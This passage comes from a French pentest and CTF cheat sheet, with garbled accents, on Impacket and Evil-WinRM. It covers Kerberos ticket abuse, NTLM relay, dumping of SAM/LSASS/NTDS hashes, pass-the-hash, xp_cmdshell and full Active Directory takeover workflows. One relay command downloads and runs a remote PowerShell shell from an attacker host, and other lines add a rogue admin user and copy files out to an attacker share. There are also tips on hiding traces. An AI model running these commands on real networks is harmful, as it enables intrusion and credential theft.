- [Post-exploitation Windows](../05-post-exploitation/windows-privesc.md) - Utiliser les credentials trouvÃ©s

---

### **getTGT.py / getST.py** - Tickets Kerberos

Manipuler les tickets Kerberos manuellement. UtilisÃ© pour des attaques avancÃ©es Active Directory.

#### getTGT.py - Obtenir un Ticket Granting Ticket
```bash
# Obtenir un TGT avec password
impacket-getTGT DOMAIN/username:password

# Avec hash NTLM
impacket-getTGT DOMAIN/username -hashes :NTHASH

# SpÃ©cifier le DC
impacket-getTGT DOMAIN/username:password -dc-ip DC_IP

# Le TGT est sauvegardÃ© dans username.ccache
```

#### getST.py - Obtenir un Service Ticket
```bash
# Obtenir un Service Ticket (TGS) pour un SPN spÃ©cifique
impacket-getST DOMAIN/username:password -spn SERVICE/target

# Exemples de SPN
impacket-getST CORP.LOCAL/user:password -spn MSSQLSvc/SQL01.corp.local:1433
impacket-getST CORP.LOCAL/user:password -spn cifs/DC01.corp.local
impacket-getST CORP.LOCAL/user:password -spn HTTP/webapp.corp.local

# Avec hash
impacket-getST DOMAIN/username -hashes :NTHASH -spn SERVICE/target
```

#### Utiliser les tickets obtenus
```bash
# Exporter le ticket dans l'environnement
export KRB5CCNAME=/path/to/username.ccache

# Utiliser avec d'autres outils Impacket
impacket-psexec DOMAIN/username@TARGET -k -no-pass
impacket-wmiexec DOMAIN/username@TARGET -k -no-pass
impacket-smbclient DOMAIN/username@TARGET -k -no-pass
```

**ðŸ”— Usage avancÃ© :** 
- Overpass-the-Hash (Pass-the-Ticket)
- Golden Ticket / Silver Ticket attacks
- Kerberos delegation attacks
- S4U2Self / S4U2Proxy exploitation

**ðŸ’¡ Quand utiliser getTGT/getST ?**
- âœ… Attaques Golden/Silver Ticket (crÃ©ation de tickets forgÃ©s)
- âœ… Delegation attacks (unconstrained/constrained delegation)
- âœ… Pass-the-Ticket aprÃ¨s vol de tickets
- âœ… Contournement de restrictions basÃ©es sur NTLM

**ðŸ”— Voir aussi :**
- [GetUserSPNs.py](#getuserspnspy---kerberoasting) - Kerberoasting (extraction + cracking)
- [GetNPUsers.py](#getnpuserspy---asreproast) - ASREPRoast

---

## ðŸ” Ã‰numÃ©ration

### **lookupsid.py** - Ã‰numÃ©ration SID

Ã‰numÃ©rer les utilisateurs et groupes via les SID (Security Identifier).

```bash
# Ã‰numÃ©ration anonyme
impacket-lookupsid guest@IP

# Avec credentials
impacket-lookupsid username:password@IP

# Exemple
impacket-lookupsid guest@10.129.95.187
```

**ðŸ’¡ Utile pour :** DÃ©couvrir des comptes cachÃ©s, Ã©numÃ©rer le domaine

---

### **rpcdump.py** - Ã‰numÃ©ration RPC

Ã‰numÃ©rer les endpoints RPC disponibles sur une machine.

```bash
# Dump RPC sans auth
impacket-rpcdump @IP

# Avec credentials
impacket-rpcdump username:password@IP

# Exemple pratique
impacket-rpcdump @10.129.95.187
```

**ðŸ’¡ Utile pour :** DÃ©couvrir les services RPC disponibles, identifier les endpoints exploitables

---

## ðŸ”€ NTLM Relay

### **ntlmrelayx.py** - Relay NTLM

Relayer les authentifications NTLM vers une cible pour obtenir un accÃ¨s. **Attaque MITM** qui intercepte l'authentification d'une victime et la relaie vers une cible.

#### Syntaxe basique
```bash
# Relay basique vers SMB
impacket-ntlmrelayx -t TARGET_IP -smb2support

# Avec exÃ©cution de commande (â­ trÃ¨s puissant)
impacket-ntlmrelayx -t TARGET_IP -c "whoami"
impacket-ntlmrelayx -t TARGET_IP -c "net user hacker P@ssw0rd /add"

# Vers plusieurs cibles (fichier targets.txt)
impacket-ntlmrelayx -tf targets.txt -smb2support

# Avec dump SAM automatique
impacket-ntlmrelayx -t TARGET_IP -smb2support --dump-sam

# Avec dump LSASS
impacket-ntlmrelayx -t TARGET_IP -smb2support --dump-lsass
```

#### Exemples pratiques
```bash
# Exemple 1 : Relay vers un serveur pour obtenir un shell
impacket-ntlmrelayx -t 10.10.10.100 -smb2support -c "powershell -c iex(new-object net.webclient).downloadstring('http://KALI_IP/shell.ps1')"

# Exemple 2 : Relay vers plusieurs cibles
cat targets.txt
10.10.10.100
10.10.10.101
10.10.10.102

impacket-ntlmrelayx -tf targets.txt -smb2support

# Exemple 3 : Dump automatique des credentials
impacket-ntlmrelayx -t 10.10.10.100 -smb2support --dump-sam --dump-lsass
```

**ðŸ”— Combinaison typique (attaque complÃ¨te) :**
```bash
# Terminal 1 : Lancer ntlmrelayx (attente de victimes)
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Terminal 2 : Forcer une authentification (Responder, mitm6, PetitPotam, etc.)
# MÃ©thode 1 : Responder (capture + relay)
sudo responder -I eth0 -rdwv

# MÃ©thode 2 : mitm6 (IPv6 spoofing)
sudo mitm6 -d domain.local

# MÃ©thode 3 : PetitPotam (force l'authentification depuis un DC)
python3 PetitPotam.py -u user -p password -d domain.local KALI_IP TARGET_IP

# DÃ¨s qu'une victime s'authentifie â†’ ntlmrelayx relaie vers les cibles
# â†’ ExÃ©cution de commande ou dump de credentials âœ…
```

**ðŸ’¡ PrÃ©requis pour que Ã§a marche :**
- âœ… SMB Signing dÃ©sactivÃ© sur la cible (vÃ©rifier avec `nmap --script=smb2-security-mode`)
- âœ… L'utilisateur qui s'authentifie doit Ãªtre admin local sur la cible
- âœ… Vous devez Ãªtre sur le mÃªme rÃ©seau (MITM)

**ðŸ’¡ DÃ©tection et contre-mesures :**
- ðŸ›¡ï¸ Activer SMB Signing sur tous les serveurs
- ðŸ›¡ï¸ Utiliser LDAP Signing et Channel Binding
- ðŸ›¡ï¸ Monitorer les authentifications NTLM anormales
- ðŸ›¡ï¸ Segmentation rÃ©seau (limiter le relaying)

**ðŸ”— Voir aussi :**
- [Pivoting & Firewall Bypass](../09-pivoting/firewall-bypass.md) - Techniques MITM avancÃ©es
- [Responder](https://github.com/lgandx/Responder) - Capture d'authentifications NTLM
- [PetitPotam](https://github.com/topotam/PetitPotam) - Force l'authentification NTLM

---

## ðŸ’¡ COMMANDES ESSENTIELLES - MÃ‰MO RAPIDE

Cette section regroupe les commandes Impacket les plus utilisÃ©es dans les CTF/HTB et pentests rÃ©els.

### ðŸ—„ï¸ MSSQL (le plus utilisÃ© pour DB)
```bash
# Connexion avec authentification Windows
impacket-mssqlclient DOMAIN/user:password@IP -windows-auth

# Connexion standard
impacket-mssqlclient user:password@IP

# Pass-the-Hash
impacket-mssqlclient DOMAIN/user@IP -hashes :NTHASH -windows-auth

# Une fois connectÃ© :
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');  # VÃ©rifier privilÃ¨ges (1=admin)
SQL> ENABLE_xp_cmdshell                     # Activer exÃ©cution commandes
SQL> xp_cmdshell "whoami"                   # ExÃ©cuter commandes Windows
```

### ðŸ–¥ï¸ Shells Windows (les plus utilisÃ©s)
```bash
# PSExec - Shell via SMB (port 445) - Le plus classique
impacket-psexec administrator:password@IP
impacket-psexec administrator@IP -hashes :NTHASH

# WMIExec - Shell via WMI (port 135) - Plus discret
impacket-wmiexec administrator:password@IP
impacket-wmiexec administrator@IP -hashes :NTHASH

# SMBExec - Shell via SMB alternatif
impacket-smbexec administrator:password@IP
```

### ðŸ’Ž Dump de hashes (trÃ¨s puissant)
```bash
# Dump SAM/LSA/NTDS d'une machine Windows
impacket-secretsdump administrator:password@IP
impacket-secretsdump administrator@IP -hashes :NTHASH

# Dump uniquement NTDS.dit (Domain Controller)
impacket-secretsdump DOMAIN/administrator:password@DC_IP -just-dc

# RÃ©sultat typique :
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
#                                                  â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘
#                                                  NT Hash pour Pass-the-Hash
```

### ðŸ“ Serveur SMB local (pour transferts de fichiers)
```bash
# CrÃ©er un partage SMB sur votre Kali
impacket-smbserver share $(pwd) -smb2support

# Avec authentification
impacket-smbserver share $(pwd) -smb2support -username kali -password kali

# Depuis Windows, utiliser :
# copy \\KALI_IP\share\nc.exe C:\Temp\nc.exe
# copy C:\Users\Admin\passwords.txt \\KALI_IP\share\
```

### ðŸŽ« Kerberos (Active Directory)
```bash
# ASREPRoast - Attaquer comptes sans prÃ©-auth Kerberos
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# Kerberoasting - Extraire TGS de comptes de service
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request -outputfile tgs.txt

# Cracker ensuite avec hashcat :
hashcat -m 18200 asrep.txt rockyou.txt  # ASREPRoast
hashcat -m 13100 tgs.txt rockyou.txt    # Kerberoasting
```

### ðŸ” Ã‰numÃ©ration
```bash
# Ã‰numÃ©ration SID (utilisateurs du domaine)
impacket-lookupsid DOMAIN/user:password@IP

# Client SMB interactif
impacket-smbclient user:password@IP
impacket-smbclient guest@IP -no-pass

# Ã‰numÃ©ration RPC
impacket-rpcdump @IP
```

### ðŸ”„ Workflow complet type (HTB/CTF)
```bash
# 1ï¸âƒ£ Ã‰numÃ©ration MSSQL
impacket-mssqlclient DOMAIN/sql_svc:password@IP -windows-auth
SQL> ENABLE_xp_cmdshell
SQL> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# â†’ Trouve password admin

# 2ï¸âƒ£ Shell admin via Evil-WinRM (si port 5985 ouvert)
evil-winrm -i IP -u administrator -p 'password_found'

# OU via PSExec (si port 445 ouvert)
impacket-psexec administrator:password_found@IP

# 3ï¸âƒ£ Dump des credentials
impacket-secretsdump administrator:password@IP

# 4ï¸âƒ£ Pass-the-Hash vers autres machines
impacket-psexec administrator@OTHER_IP -hashes :NTHASH
```

---

## ðŸ“Š TABLEAU RÃ‰CAPITULATIF IMPACKET

| Outil | Protocole | Port | Usage Principal |
|-------|-----------|------|-----------------|
| **mssqlclient.py** | MSSQL | 1433 | âœ… Shell SQL Server |
| **psexec.py** | SMB | 445 | âœ… Shell admin Windows |
| **wmiexec.py** | WMI | 135 | Shell via WMI (discret) |
| **smbexec.py** | SMB | 445 | Shell SMB (sans service) |
| **secretsdump.py** | SMB | 445 | â­ Dump de hashes |
| **smbclient.py** | SMB | 445 | Client SMB |
| **smbserver.py** | SMB | 445 | â­ Serveur SMB local |
| **ntlmrelayx.py** | SMB | 445 | Relay NTLM |
| **GetNPUsers.py** | Kerberos | 88 | ASREPRoast |
| **GetUserSPNs.py** | Kerberos | 88 | Kerberoasting |
| **getTGT.py** | Kerberos | 88 | Obtenir TGT |
| **getST.py** | Kerberos | 88 | Obtenir Service Ticket |
| **lookupsid.py** | RPC/SMB | 135/445 | Ã‰numÃ©ration SID |
| **rpcdump.py** | RPC | 135 | Ã‰numÃ©ration RPC |

---

## ðŸ†š EVIL-WINRM (Alternative - PAS Impacket)

Evil-WinRM n'est **PAS** un outil Impacket, mais une **alternative Ruby** pour WinRM.

```bash
# Installation
gem install evil-winrm

# Connexion avec password
evil-winrm -i IP -u username -p 'password'

# Connexion avec hash
evil-winrm -i IP -u username -H NTHASH

# HTTPS (port 5986)
evil-winrm -i IP -u username -p 'password' -S

# Exemple
evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!'
```

### Quand utiliser Evil-WinRM vs Impacket ?

```
âœ… Evil-WinRM :
- Port 5985/5986 (WinRM) ouvert
- Shell PowerShell natif
- Upload/Download facile
- Environnement moderne

âœ… Impacket (psexec/wmiexec) :
- Port 445 (SMB) ou 135 (WMI) ouvert
- WinRM dÃ©sactivÃ©/bloquÃ©
- Pass-the-Hash
- Environnement legacy
```

---

## ðŸŽ¯ WORKFLOW TYPIQUE HTB/CTF

```bash
# 1ï¸âƒ£ Ã‰numÃ©ration
nmap -p 445,1433,5985 IP

# 2ï¸âƒ£ Si MSSQL (1433) ouvert
impacket-mssqlclient DOMAIN/user:pass@IP -windows-auth
SQL> ENABLE_xp_cmdshell
SQL> xp_cmdshell "whoami"

# 3ï¸âƒ£ Escalade de privilÃ¨ges
SQL> xp_cmdshell "type C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# â†’ Trouver password admin

# 4ï¸âƒ£ Connexion admin
# Si WinRM (5985) ouvert :
evil-winrm -i IP -u administrator -p 'password'

# Si SMB (445) ouvert :
impacket-psexec administrator:password@IP

# 5ï¸âƒ£ Flag
C:\> type C:\Users\Administrator\Desktop\root.txt
```

---

## ðŸŽ¯ Workflow d'Attaque Type

### ScÃ©nario 1 : Machine Windows Standalone

```bash
# 1. Ã‰numÃ©ration initiale
nmap -sV -p 445,1433,3389 TARGET_IP

# 2. Ã‰numÃ©ration SMB
impacket-smbclient guest@TARGET_IP -no-pass

# 3. Si MSSQL ouvert, tester connexion
impacket-mssqlclient sa:password@TARGET_IP

# 4. Obtenir un shell via xp_cmdshell
SQL> ENABLE_xp_cmdshell
SQL> xp_cmdshell "whoami"

# 5. Dump des credentials
impacket-secretsdump administrator:password@TARGET_IP

# 6. Pass-the-Hash vers d'autres machines
impacket-psexec administrator@TARGET_IP2 -hashes :NTHASH
```

---

### ScÃ©nario 2 : Active Directory

```bash
# 1. Obtenir credentials initiaux (phishing, spray, etc.)
# User: john.doe / Password: Summer2024!

# 2. Kerberoasting
impacket-GetUserSPNs CORP.LOCAL/john.doe:Summer2024! -dc-ip DC_IP -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt

# 3. Obtenu : svc_mssql / P@ssw0rd123

# 4. Ã‰numÃ©ration avec credentials service
impacket-smbclient CORP.LOCAL/svc_mssql:P@ssw0rd123@DC_IP

# 5. Si le compte est admin local quelque part
impacket-psexec CORP.LOCAL/svc_mssql:P@ssw0rd123@WORKSTATION01

# 6. Dump LSASS / SAM
impacket-secretsdump CORP.LOCAL/svc_mssql:P@ssw0rd123@WORKSTATION01

# 7. Obtenu hash de admin_local â†’ Pass-the-Hash

# 8. Spray le hash sur le rÃ©seau
crackmapexec smb 10.10.10.0/24 -u administrator -H HASH --continue-on-success

# 9. Si admin sur le DC â†’ Dump NTDS.dit
impacket-secretsdump CORP.LOCAL/administrator@DC_IP -hashes :HASH -just-dc

# 10. Domaine compromis âœ…
```

---

## ðŸ”— Liens avec d'autres sections

### Outils complÃ©mentaires
- [CrackMapExec](crackmapexec.md) - Spray de credentials automatisÃ©
- [Evil-WinRM](evil-winrm.md) - Si WinRM est ouvert (port 5985)
- [SMBClient](smbclient.md) - Client SMB alternatif
- [Hydra](hydra.md) - Bruteforce initial

### Phases de pentest
- [Ã‰numÃ©ration SMB](../03-enumeration/smb-samba.md) - Avant utilisation d'Impacket
- [Ã‰numÃ©ration MSSQL](../03-enumeration/mysql.md) - Bases de donnÃ©es
- [Post-exploitation Windows](../05-post-exploitation/windows-privesc.md) - AprÃ¨s accÃ¨s initial
- [Pivoting](../09-pivoting/) - Utiliser Impacket pour le mouvement latÃ©ral

### Payloads
- [Reverse Shells](../08-payloads/reverse-shells.md) - Shells Ã  exÃ©cuter via xp_cmdshell

---

## ðŸ’¡ Bonnes Pratiques

### SÃ©curitÃ© OpÃ©rationnelle
```bash
# Toujours utiliser un VPN/Pivot pour masquer votre IP
# Nettoyer les traces aprÃ¨s exploitation
# Utiliser wmiexec au lieu de psexec (plus discret)
# Ã‰viter xp_cmdshell si d'autres options existent
```

### Performance
```bash
# Sauvegarder les rÃ©sultats
impacket-secretsdump admin:pass@IP > hashes.txt

# Utiliser des fichiers de cibles
cat targets.txt
10.10.10.1
10.10.10.2
10.10.10.3

# Automatiser avec des boucles
for ip in $(cat targets.txt); do
  impacket-psexec admin@$ip -hashes :HASH
done
```

---

## ðŸ“š Ressources

- **GitHub Officiel :** https://github.com/SecureAuthCorp/impacket
- **Documentation :** https://www.secureauth.com/labs/open-source-tools/impacket/
- **Exemples :** `/usr/share/doc/python3-impacket/examples/` (Kali Linux)

---

**ðŸŽ“ Prochaines Ã©tapes :**
- Pratiquer sur **HackTheBox** : Machines Windows/Active Directory
- Combiner avec **BloodHound** pour cartographie AD
- Ã‰tudier **Mimikatz** pour extraction de credentials en mÃ©moire
